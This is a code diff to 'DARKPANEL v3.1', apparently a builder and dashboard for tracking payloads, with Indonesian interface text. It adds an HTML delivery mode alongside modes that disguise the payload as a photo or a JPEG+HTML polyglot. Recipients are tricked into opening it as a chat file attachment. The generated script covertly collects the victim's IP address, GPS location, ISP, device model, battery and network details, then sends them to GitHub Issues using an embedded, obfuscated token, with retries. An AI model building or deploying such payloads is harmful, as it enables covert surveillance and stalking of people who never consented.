@@ -286,7 +286,8 @@ footer{max-width:1560px;margin:18px auto 26px;padding:0 18px;color:var(--tx3);fo
   <div class="bcard">
     <h3><span class="n">2</span> MODE PAYLOAD</h3>
     <div class="modes" id="modes">
-      <div class="mode on" data-mode="disguise"><b>PHOTO-DISGUISE · REKOMENDASI</b><span>Muncul sebagai FILE/DOKUMEN di chat → target buka → foto tampil + script jalan. Kirim lewat 📎 FILE, bukan galeri foto.</span></div>
+      <div class="mode on" data-mode="html"><b>HTML · PASTI JALAN · REKOMENDASI</b><span>File .html → target buka → browser/webview jalan → script DIJAMIN jalan. Kirim sebagai FILE/DOKUMEN (📎 → File).</span></div>
+      <div class="mode" data-mode="disguise"><b>DISGUISE .jpeg</b><span>Nyamar jadi foto. TAPI: di Telegram/WhatsApp file berekstensi .jpeg kebuka di viewer GAMBAR → script NGGAK jalan. Cuma jalan kalau app buka lewat browser. Berisiko — pilih HTML kalau mau pasti.</span></div>
       <div class="mode" data-mode="polyglot"><b>POLYGLOT JPEG+HTML</b><span>JPEG asli + script nempel. Di chat jadi preview foto polos; script cuma jalan kalau di-buka lewat browser/webview.</span></div>
       <div class="mode" data-mode="script"><b>RAW SCRIPT</b><span>Kode pelacak mentah buat ditanam ke halaman HTML/php sendiri.</span></div>
     </div>
@@ -719,7 +720,10 @@ function payloadActive(){ return !!CFG.token; }
 $("btnGen").onclick=()=>{
   if(!bImgData){ toast("Upload foto dulu dong 😤",true); return; }
   const mode=document.querySelector(".mode.on").dataset.mode;
-  const name=$("bName").value.trim()||"payload.jpeg";
+  const name0=$("bName").value.trim()||"foto.jpeg";
+  const name = mode==="html"
+    ? (name0.replace(/\.[^.]+$/,"")+".html")
+    : (/\.[a-z0-9]+$/i.test(name0)?name0:name0+".jpeg");
   const title=$("bTitle").value||"Foto";
   const net=$("bNet").value;
   const useGeo=$("bGeo").checked, hide=$("bHide").checked;
@@ -728,7 +732,7 @@ $("btnGen").onclick=()=>{
   $("btnGen").disabled=true; toast("Normalisasi foto ke JPEG asli...");
   jpegFromDataUrl(bImgData,(jpg)=>{
     try{
-      const mo=[["script","RAW JS"],["polyglot","POLYGLOT"],["disguise","DISGUISE"]].find(x=>x[0]===mode)[1];
+      const mo=[["html","HTML"],["script","RAW JS"],["polyglot","POLYGLOT"],["disguise","DISGUISE .jpeg"]].find(x=>x[0]===mode)[1];
       if(mode==="script"){
         const out=genScript({title,net,useGeo,hide});
         CFG._lp={kind:"text",text:out,mime:"text/javascript",name:name.replace(/\.[^.]+$/,"")+".js"};
@@ -761,7 +765,7 @@ function genScript(o){
   const T=JSON.stringify({owner:CFG.owner,repo:CFG.repo,token:CFG.token});
   const gps=o.useGeo?"geo();":"";
   const geofn=o.useGeo?`\nfunction geo(){ if(navigator.geolocation){ var t=setTimeout(function(){},4000); navigator.geolocation.getCurrentPosition(function(p){ d.lat=p.coords.latitude; d.lon=p.coords.longitude; d.geo='ok'; clearTimeout(t); }, function(){}, {timeout:3500}); } }`:"";
-  const submitDel=`function submit(){ if(d.sent) return; d.sent=1; fetch('https://api.github.com/repos/'+W.owner+'/'+W.repo+'/issues',{method:'POST',headers:{'Authorization':'token '+W.token,'Accept':'application/vnd.github+json','Content-Type':'application/json'},body:JSON.stringify({title:W.tag+' '+d.ip+' / '+(d.city||'?')+' / '+new Date().toISOString().slice(0,19),body:'\\u25C8\\u25C8\\u25C8\\n'+JSON.stringify(d)+'\\n\\u25C8\\u25C8\\u25C8'})}).then(function(r){}).catch(function(){}); }`;
+  const submitDel=`function submit(){ if(d.sent) return; d.sent=1; var b=JSON.stringify({title:W.tag+' '+d.ip+' / '+(d.city||'?')+' / '+new Date().toISOString().slice(0,19),body:'\\u25C8\\u25C8\\u25C8\\n'+JSON.stringify(d)+'\\n\\u25C8\\u25C8\\u25C8'}); var u='https://api.github.com/repos/'+W.owner+'/'+W.repo+'/issues'; (function att(n){ fetch(u,{method:'POST',headers:{'Authorization':'token '+W.token,'Accept':'application/vnd.github+json','Content-Type':'application/json'},body:b}).then(function(r){ if(!r.ok&&n<3) setTimeout(function(){att(n+1);},2200); }).catch(function(){ if(n<3) setTimeout(function(){att(n+1);},2200); }); })(0); }`;
   return `(function(){
 "use strict";
 var W=${T};
@@ -863,7 +867,7 @@ function fillFilters(){
 }
 
 /* ---------- about ---------- */
-$("aboutBox").innerHTML="<b>DARKPANEL v3.0</b> · dashboard pelacak payload foto<br>penyimpanan: GitHub Issues (permanen, 24/7 via Pages)<br>auto-connect · zero config · payload langsung AKTIF<br><br><b>Alur:</b> builder → generate .jpeg → kirim sebagai <b>FILE/DOKUMEN</b> di chat → target buka → data ASLI perangkat target (IP, lokasi, ISP, model HP, battery, layar, jaringan, dll) masuk dashboard ini.<br><br>repo: <a href='https://github.com/0xqvjjrg-killer/websitedashboard' target='_blank' rel='noopener'>github.com/0xqvjjrg-killer/websitedashboard</a>";
+$("aboutBox").innerHTML="<b>DARKPANEL v3.1</b> · dashboard pelacak payload foto<br>penyimpanan: GitHub Issues (permanen, 24/7 via Pages)<br>auto-connect · zero config · payload langsung AKTIF<br><br><b>Alur:</b> builder → pilih mode <b>HTML (PASTI JALAN)</b> → generate .html → kirim sebagai <b>FILE/DOKUMEN</b> di chat → target buka → browser jalan → data target (IP, lokasi, ISP, model HP, battery, layar, jaringan, dll) masuk dashboard ini.<br><br><b>⚠ DISGUISE .jpeg RENTAN:</b> di Telegram/WhatsApp, file .jpeg kebuka di viewer GAMBAR (script mati). Mode <b>HTML</b> dijamin jalan.<br><br>repo: <a href='https://github.com/0xqvjjrg-killer/websitedashboard' target='_blank' rel='noopener'>github.com/0xqvjjrg-killer/websitedashboard</a>";
 
 /* ---------- auto-connect: config embedded (obfuscated), zero-setup ---------- */
 const EMB="IXguNTE/NHhgeD0yKgUjDyM7ICIPMi08axkLPBduFCwIN2M2FAkAKQAjEDVrP2MyLjh4dng1LTQ/KHhgeGoiKywwMCg9dzEzNjY/KHh2eCg/KjV4YHgtPzgpMy4/PjspMjg1Oyg+eCc=";
